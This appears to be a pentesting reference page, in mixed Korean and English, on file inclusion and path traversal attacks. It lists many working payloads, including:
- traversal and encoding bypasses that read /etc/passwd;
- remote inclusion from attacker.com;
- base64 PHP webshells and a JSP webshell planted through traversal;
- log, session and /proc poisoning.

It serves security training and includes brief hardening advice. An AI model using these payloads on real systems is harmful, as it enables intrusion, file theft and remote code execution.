# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 파일이 원격 서버에서 로드됩니다 (최고: 코드를 작성하면 서버가 이를 실행합니다). php에서는 기본적으로 **비활성화**되어 있습니다 (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드합니다.

이 취약점은 사용자가 서버가 로드할 파일을 어떤 방식으로든 제어할 수 있을 때 발생합니다.

취약한 **PHP 함수**: require, require_once, include, include_once

이 취약점을 악용하기 위한 흥미로운 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 \*nix LFI 목록을 혼합하고 경로를 더 추가하여 제가 만든 목록:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

또한 `/`를 `\`로 바꿔보세요\
또한 `../../../../../`를 추가해보세요

취약점 존재 여부를 확인하기 위해 /etc/password 파일을 찾는 여러 기법을 사용한 목록은 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

다른 wordlists의 병합:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

또한 `/`를 `\`로 바꿔보세요\
또한 `C:/`를 제거하고 `../../../../../`를 추가해보세요

취약점 존재 여부를 확인하기 위해 /boot.ini 파일을 찾는 여러 기법을 사용한 목록은 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux의 LFI 리스트를 확인하세요.

## 기본 LFI 및 우회

모든 예제는 Local File Inclusion을 위한 것이지만 Remote File Inclusion에도 적용될 수 있습니다 (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences가 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열 끝에 더 많은 문자를 덧붙이는 것을 우회 (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 문제는 **PHP 5.4에서 해결되었습니다**

### **인코딩**

double URL encode (및 기타)와 같은 비표준 인코딩을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 존재하는 폴더에서

아마 백엔드가 폴더 경로를 검사하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버의 파일 시스템 디렉토리 탐색

서버의 파일 시스템은 특정 기법을 사용하여 파일뿐만 아니라 디렉토리도 재귀적으로 탐색할 수 있습니다. 이 과정은 현재 디렉토리의 깊이를 파악하고 특정 폴더의 존재를 확인하는 절차를 포함합니다. 아래는 이를 달성하기 위한 자세한 방법입니다:

1. **디렉토리 깊이 결정:** 현재 디렉토리의 깊이는 `/etc/passwd` 파일을 성공적으로 가져와 확인합니다 (서버가 Linux 기반인 경우에 해당). 예시 URL은 다음과 같이 구성될 수 있으며, 이는 깊이가 3임을 나타냅니다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 탐색:** 의심되는 폴더 이름(예: `private`)을 URL에 추가한 다음 `/etc/passwd`로 다시 이동하세요. 추가된 디렉터리 레벨 때문에 깊이를 하나 늘려야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** 서버 응답은 해당 폴더의 존재 여부를 나타냅니다:
- **Error / No Output:** 지정된 위치에 `private` 폴더가 존재하지 않을 가능성이 큽니다.
- **Contents of `/etc/passwd`:** `/etc/passwd`의 내용이 반환되면 `private` 폴더의 존재가 확인됩니다.
4. **Recursive Exploration:** 발견된 폴더는 동일한 기법이나 전통적인 Local File Inclusion (LFI) 방법을 사용하여 하위 디렉토리나 파일을 더 조사할 수 있습니다.

파일 시스템의 다른 위치에 있는 디렉토리를 탐색하려면 payload를 적절히 조정하세요. 예를 들어 현재 디렉토리가 깊이 3에 있다고 가정하면 `/var/www/`에 `private` 디렉토리가 있는지 확인하려면 다음을 사용하세요:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션의 파일 경로를 조작하기 위해 사용되는 기법입니다. 이는 종종 파일 경로 끝에 추가 문자를 붙이는 특정 보안 조치를 우회하여 제한된 파일에 접근하는 데 사용됩니다. 목표는 보안 조치에 의해 변경된 후에도 여전히 원하는 파일을 가리키는 파일 경로를 만드는 것입니다.

In PHP, 다양한 파일 경로 표현이 파일 시스템의 특성으로 인해 동등하게 취급될 수 있습니다. 예를 들어:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` 는 모두 동일한 경로로 취급됩니다.
- 마지막 6자가 `passwd`일 때, `/`를 추가해 `passwd/`로 만들어도 대상 파일은 변경되지 않습니다.
- 마찬가지로 파일 경로에 `.php`가 붙어 있을 때(예: `shellcode.php`), 끝에 `/.`를 추가해도 접근하는 파일은 변경되지 않습니다.

The provided examples demonstrate how to utilize path truncation to access `/etc/passwd`, a common target due to its sensitive content (user account information):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서는 필요한 traversals 수가 약 2027회일 수 있지만, 이 수치는 서버의 구성에 따라 달라질 수 있습니다.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`)와 추가적인 dot segments 및 문자들을 결합하면 파일 시스템을 탐색하는 데 사용될 수 있으며, 서버가 덧붙인 문자열을 사실상 무시하게 만들 수 있습니다.
- **Determining the Required Number of Traversals**: 시도와 오류를 통해 루트 디렉터리로, 그 다음 `/etc/passwd`로 이동하는 데 필요한 정확한 `../` 시퀀스 수를 찾을 수 있으며, 이때 `.php` 같은 덧붙여진 문자열을 무력화시키면서 원하는 경로(`/etc/passwd`)는 그대로 유지되도록 할 수 있습니다.
- **Starting with a Fake Directory**: 경로를 존재하지 않는 디렉터리(예: `a/`)로 시작하는 것은 일반적인 관행입니다. 이 기법은 예비 조치로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

When employing path truncation techniques, 서버의 경로 파싱 동작과 파일시스템 구조를 이해하는 것이 매우 중요합니다. 각 시나리오마다 다른 접근 방식이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해서는 테스트가 종종 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 비활성화되어 있습니다. 그 이유는 **`allow_url_include`**가 **Off.**이기 때문입니다. 작동하려면 **On**이어야 하며, 그 경우 서버의 PHP 파일을 포함하여 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
만약 어떤 이유로 **`allow_url_include`** 가 **On** 이지만 PHP가 **filtering** 방식으로 외부 웹페이지 접근을 막고 있다면, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data 프로토콜과 base64를 사용해 b64 PHP 코드를 디코딩하여 RCE를 얻을 수 있습니다:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서 마지막 `+.txt`는 공격자가 문자열이 `.txt`로 끝나길 원했기 때문에 추가한 것입니다. 그래서 문자열은 그것으로 끝나고 b64 decode 이후 해당 부분은 단지 무의미한 데이터만 반환하므로 실제 PHP 코드만 포함(따라서 실행)됩니다.

Another example **not using the `php://` protocol** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

다음과 같은 python 코드에서:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **`file_name`**에 **절대 경로**를 전달하면, **이전 경로는 단순히 제거됩니다**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이것은 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)에 따른 의도된 동작입니다:

> 만약 어떤 컴포넌트가 절대 경로(absolute path)라면, 그 이전의 모든 컴포넌트는 버려지고 결합(joining)은 절대 경로 컴포넌트부터 계속됩니다.

## Java 디렉토리 목록

Java에서 Path Traversal이 있고 파일 대신 **디렉토리를 요청하면**, **디렉토리 목록이 반환됩니다**. 다른 언어에서는 이런 일이 발생하지 않는 것으로 보입니다(내가 알기로는).

## 상위 25개 파라미터

다음은 local file inclusion (LFI) 취약점에 노출될 수 있는 상위 25개 파라미터 목록입니다 (출처: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI: PHP 래퍼 및 프로토콜 사용

### php://filter

PHP filters는 데이터가 읽히거나 쓰이기 전에 기본적인 **데이터 수정 작업**을 수행할 수 있게 합니다. 필터에는 5가지 범주가 있습니다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그를 제거합니다 ( "<" 와 ">" 문자 사이의 모든 것 )
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환합니다(`convert.iconv.<input_enc>.<output_enc>`). 지원하는 **모든 인코딩의 목록**을 얻으려면 콘솔에서 `iconv -l`을 실행하세요.

> [!WARNING]
> `convert.iconv.*` 변환 필터를 악용하면 **임의의 텍스트를 생성**할 수 있으며, 이는 임의 텍스트를 쓰거나 include 같은 함수가 임의의 텍스트를 처리하도록 하는 데 유용할 수 있습니다. 자세한 내용은 [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) 를 참고하세요.

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축합니다 (대량의 정보를 유출할 때 유용)
- `zlib.inflate`: 데이터를 압축 해제합니다
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 사용 중단됨
- `mdecrypt.*` : 사용 중단됨
- 기타 필터
- PHP에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있습니다:
- `consumed`
- `dechunk`: HTTP chunked 인코딩을 역변환합니다
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> 해당 부분 "php://filter" 은 대소문자를 구분하지 않습니다

### php filters as oracle를 사용하여 임의 파일 읽기

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) 에서는 서버로부터 출력이 직접 반환되지 않는 상황에서 로컬 파일을 읽는 기법을 제안합니다. 이 기법은 **boolean exfiltration of the file (char by char) using php filters** 를 oracle로 사용하는 방식에 기반합니다. 이는 php filters를 이용해 텍스트를 충분히 크게 만들어 php가 예외를 발생시키도록 할 수 있기 때문입니다.

원문 포스트에는 기법에 대한 자세한 설명이 있으니 참고하시고, 여기서는 간단한 요약을 제공합니다:

- 코덱 **`UCS-4LE`** 를 사용해 텍스트의 선행 문자를 앞에 남겨두고 문자열의 크기가 기하급수적으로 증가하게 만듭니다.
- 이렇게 하면 초기 문자가 정확히 맞았을 때 **매우 큰 텍스트를 생성**하여 php가 **error** 를 발생시킬 수 있습니다.
- **dechunk** 필터는 **첫 문자가 hexadecimal이 아니면 모든 것을 제거**하므로, 첫 문자가 hex인지 아닌지 알 수 있습니다.
- 앞의 것과 (그리고 추측한 문자에 따라 다른 필터들과) 결합하면, 충분한 변환을 했을 때 해당 문자가 hexadecimal 문자가 아니게 되는 시점을 보고 텍스트의 처음 문자를 추측할 수 있습니다. 만약 hex라면 dechunk가 삭제하지 않고 초기 폭탄이 php error를 발생시킵니다.
- 코덱 **convert.iconv.UNICODE.CP930** 은 모든 문자를 다음 문자로 변환합니다(예: 이 코덱 후: a -> b). 따라서 예를 들어 첫 문자가 `a`인지 알아내려면 이 코덱을 6번 적용하면 a->b->c->d->e->f->g가 되어 더 이상 hexadecimal 문자가 아니게 되고, 그 결과 dechunk가 삭제하지 않아 초기 폭탄과 합쳐져 php error가 발생합니다.
- 처음에 **rot13** 같은 변환을 적용하면 n, o, p, q, r 같은 다른 문자들을 leak할 수 있으며(그리고 다른 코덱들을 사용해 다른 문자들을 hex 범위로 이동시킬 수 있습니다).
- 초기 문자가 숫자일 경우에는 base64 encode가 필요하며 숫자를 알아내려면 앞의 2문자를 leak해야 합니다.
- 최종 문제는 **초기 문자 이상을 어떻게 leak할지** 입니다. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** 같은 order memory 필터를 사용하면 문자들의 순서를 바꿔 텍스트의 다른 문자를 첫 번째 위치로 가져올 수 있습니다.
- 추가 데이터를 얻기 위해서는 아이디어는 **convert.iconv.UTF16.UTF16** 으로 시작 시점에 2바이트의 정크 데이터를 생성하고, **UCS-4LE** 를 적용해 그것을 다음 2바이트와 **피벗**시키며, **정크 데이터가 나올 때까지 데이터를 삭제**하는 것입니다(이렇게 하면 초기 텍스트의 처음 2바이트가 제거됩니다). 원하는 비트까지 도달할 때까지 이 과정을 반복합니다.

포스트에서는 이 과정을 자동으로 수행하는 도구도 공개되었습니다: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

이 wrapper는 프로세스가 연 파일 디스크립터에 접근할 수 있게 해줍니다. 열린 파일들의 내용을 exfiltrate하는 데 잠재적으로 유용할 수 있습니다:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (not sure how this could be useful in an attack)

### zip:// 및 rar://

PHPShell이 들어있는 Zip 또는 Rar 파일을 업로드한 뒤 접근하세요.\
rar 프로토콜을 악용하려면 **명시적으로 활성화되어야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정인 **`allow_url_open`** 및 **`allow_url_include`**에 의해 제한된다는 점에 유의하세요

### expect://

Expect는 활성화되어 있어야 합니다. 다음을 사용하여 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST 파라미터에 payload를 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 `include` 같은 파일 로딩 함수를 사용할 때 `.phar` 파일을 이용해 PHP 코드를 실행할 수 있습니다. 아래 PHP 코드 스니펫은 `.phar` 파일을 생성하는 방법을 보여줍니다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행 시 `test.phar`라는 파일이 생성되며, 이는 Local File Inclusion (LFI) 취약점을 악용하는 데 잠재적으로 활용될 수 있습니다.

LFI가 내부의 PHP 코드를 실행하지 않고 `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, 또는 `filesize()`와 같은 함수들을 통해 단순히 파일을 읽기만 하는 경우, phar 프로토콜을 이용한 파일 읽기에 연관된 deserialization 취약점을 이용해 공격을 시도할 수 있습니다. 이 취약점은 `phar` 프로토콜을 사용한 파일 읽기와 관련이 있습니다.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
매우 간단 요약: PHP 힙에서 발생한 **3 byte overflow**를 악용하여 특정 크기의 **free chunks 체인**을 변경함으로써 **임의 주소에 무엇이든 쓸 수 있게** 되었고, 그 결과 `system`을 호출하도록 후킹이 추가되었습니다.\
추가적인 php filters를 악용해 특정 크기의 청크를 할당할 수 있었습니다.

### 추가 프로토콜

더 많은 가능한[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)를 확인하세요:

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기 (file inclusion 공격에서 어떻게 유용할지는 확실하지 않습니다)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴과 일치하는 경로명 찾기 (출력 가능한 내용을 반환하지 않으므로 여기서는 별로 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일을 읽는 데에는 유용하지 않음)

## PHP의 'assert'를 통한 LFI

PHP에서 문자열 내의 코드를 실행할 수 있는 'assert' 함수를 사용할 때 Local File Inclusion (LFI) 위험이 특히 큽니다. 특히 입력에 ".." 같은 directory traversal 문자가 포함되어 있는지를 검사하더라도 이를 적절히 정제(sanitize)하지 않으면 문제가 됩니다.

예를 들어, PHP 코드는 다음과 같이 directory traversal을 방지하도록 설계될 수 있습니다:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이는 traversal를 차단하려는 목적이지만, 의도치 않게 code injection을 위한 vector를 만듭니다. 파일 내용을 읽기 위해 이를 악용하려면, attacker는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, 임의의 시스템 명령을 실행하려면 다음을 사용할 수 있다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기법은 당신이 **제어하는** **파일 경로**를 갖는 **PHP 함수**가 **파일에 접근**하도록 호출되지만 파일의 내용을 볼 수 없는 경우(예: 단순한 **`file()`** 호출처럼) 관련이 있습니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하면, 이 기법은 파일의 내용을 **매우 크게** 만들기 위해 **"UCS-4LE" encoding**을 사용하여 파일을 여는 **PHP 함수가 오류를 유발**하도록 하는 방식입니다.

그 다음, 첫 번째 문자를 **leak**하기 위해 필터 **`dechunk`** 를 다른 필터들(예: **base64**, **rot13**)과 함께 사용하고, 마지막으로 필터 **convert.iconv.UCS-4.UCS-4LE** 및 **convert.iconv.UTF16.UTF-16BE** 를 사용해 **문자들을 앞에 배치하고 leak**합니다.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

서버 측 코드가 사용자 제어 데이터(예: filename 또는 URL)를 사용해 대상 경로를 생성하면서 canonicalise(정규화)하거나 검증하지 않으면, `..` 세그먼트나 절대 경로를 통해 의도된 디렉터리를 벗어나 임의 파일 쓰기가 발생할 수 있습니다. 페이로드를 웹에 노출된 디렉터리에 배치할 수 있다면, 보통 webshell을 업로드하여 인증 없는 RCE를 얻을 수 있습니다.

Typical exploitation workflow:
- 경로/파일명을 받아 내용을 디스크에 쓰는 쓰기 primitive를 제공하는 endpoint나 background worker를 식별합니다(예: message-driven ingestion, XML/JSON command handlers, ZIP extractors 등).
- 웹에 노출된 디렉터리를 확인합니다. 일반적인 예시:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 의도된 저장 디렉터리에서 webroot로 빠져나오도록 traversal 경로를 구성하고, webshell 내용을 포함시킵니다.
- 배치된 페이로드로 이동하여 명령을 실행합니다.

Notes:
- 쓰기를 수행하는 취약한 서비스는 비-HTTP 포트에서 수신(listen)할 수 있습니다(예: TCP 4004의 JMF XML listener). 이후 메인 웹 포털(다른 포트)이 당신의 페이로드를 서빙할 수 있습니다.
- Java 스택에서는 이러한 파일 쓰기가 단순한 `File`/`Paths` 문자열 결합으로 구현되는 경우가 많습니다. 정규화/허용 목록 부재가 핵심 결함입니다.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
이 유형의 버그를 막는 하드닝:
- 경로를 정규 경로로 해석하고 허용된 베이스 디렉토리의 하위인지 강제하세요.
- `..`, 절대 루트(absolute roots) 또는 드라이브 문자(drive letters)가 포함된 경로는 거부하세요; 생성된 파일 이름을 사용하세요.
- writer를 낮은 권한 계정으로 실행하고 쓰기 디렉토리를 서비스 루트와 분리하세요.

## Remote File Inclusion

앞서 설명했습니다, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

만약 Apache 또는 Nginx 서버가 include 함수 내부에서 **LFI에 취약하다면**, **`/var/log/apache2/access.log` 또는 `/var/log/nginx/access.log`**에 접근을 시도해 **user agent**나 **GET parameter**에 **`<?php system($_GET['c']); ?>`** 같은 php shell을 넣고 그 파일을 include할 수 있습니다.

> [!WARNING]
> 셸에 **double quotes**를 **simple quotes** 대신 사용하면 큰따옴표가 문자열 "_**quote;**_"로 변경되고, 그 지점에서 **PHP가 에러를 발생시키며** 다른 것은 **실행되지 않습니다**.
>
> 또한 페이로드를 **정확히 작성**해야 합니다. 그렇지 않으면 로그 파일을 로드할 때마다 PHP가 에러를 내고 다시 시도할 기회를 얻지 못합니다.

이 방법은 다른 로그에서도 시도할 수 있지만 **주의하세요,** 로그 내부의 코드가 URL encoded되어 Shell이 손상될 수 있습니다. 헤더 **authorisation "basic"**는 Base64로 인코딩된 "user:password"를 포함하며 로그 내에서 디코딩됩니다. PHPShell은 이 헤더 안에 삽입될 수 있습니다.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 이메일을 통해

**메일을 전송**하여 내부 계정 (user@localhost)으로 PHP payload인 `<?php echo system($_REQUEST["cmd"]); ?>`를 포함한 메일을 보내고, 사용자 메일을 다음 경로들처럼 포함하려 시도하세요: **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\*를 통해

1. 많은 shells(예: 100개)를 업로드하세요  
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)를 include하세요. 여기서 $PID = 프로세스의 PID(무차별 대입으로 찾을 수 있음)이고 $FD는 파일 디스크립터(역시 무차별 대입 가능)입니다

### /proc/self/environ를 통해

로그 파일처럼, payload를 User-Agent에 넣어 전송하면 /proc/self/environ 파일 안에 반영됩니다
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 업로드를 통해

파일을 업로드할 수 있다면, 그 안에 shell payload를 주입하세요 (예: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉬운 상태로 유지하려면 이미지/문서/PDF의 메타데이터에 주입하는 것이 좋습니다

### Zip 파일 업로드를 통해

PHP shell이 포함된 ZIP 파일을 업로드한 뒤 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions를 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서 이러한 세션은 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
쿠키를 `<?php system('cat /etc/passwd');?>`로 설정하세요
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용하여 PHP 세션 파일을 포함하세요.
```
